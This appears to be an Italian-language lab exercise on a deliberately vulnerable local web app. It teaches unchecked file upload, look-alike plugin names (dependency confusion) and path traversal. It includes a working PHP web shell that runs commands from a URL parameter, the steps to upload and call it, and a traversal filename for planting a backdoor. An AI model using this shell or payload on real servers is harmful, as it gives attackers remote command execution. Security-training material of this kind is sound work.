📤 Esercizio 5: Upload e Dependency Confusion

Caricare codice malevolo mascherato da plugin legittimo
📂 Upload Senza Controlli
Il sistema permette upload senza verificare:

• Tipo file: nessun controllo MIME
• Estensione: accetta qualsiasi cosa
• Contenuto: nessuna scansione
• Dimensione: nessun limite
• Nome: nessuna sanitizzazione (path traversal!)
🎭 Dependency Confusion
Plugin esistenti:

• analytics
• backup
• security

Crea plugin con nome simile: analytics-pro, backup-enhanced, security-update
📝 L'Attacco: Upload Web Shell
Step 1: Crea un file malicious_plugin.php:
<?php // Web Shell mascherata da plugin if (isset($_GET['cmd'])) { system($_GET['cmd']); } ?>

Step 2: Vai su http://localhost:8008/upload_plugin.php

Step 3: Compila il form: Nome = "malicious", Versione = "1.0.0", File = il tuo PHP

Step 4: Accedi a: http://localhost:8008/uploads/malicious_plugin.php?cmd=id
🔀 Path Traversal
Prova a caricare un file con nome: ../../../var/www/html/backdoor.php
Il sistema potrebbe scriverlo in una directory diversa!
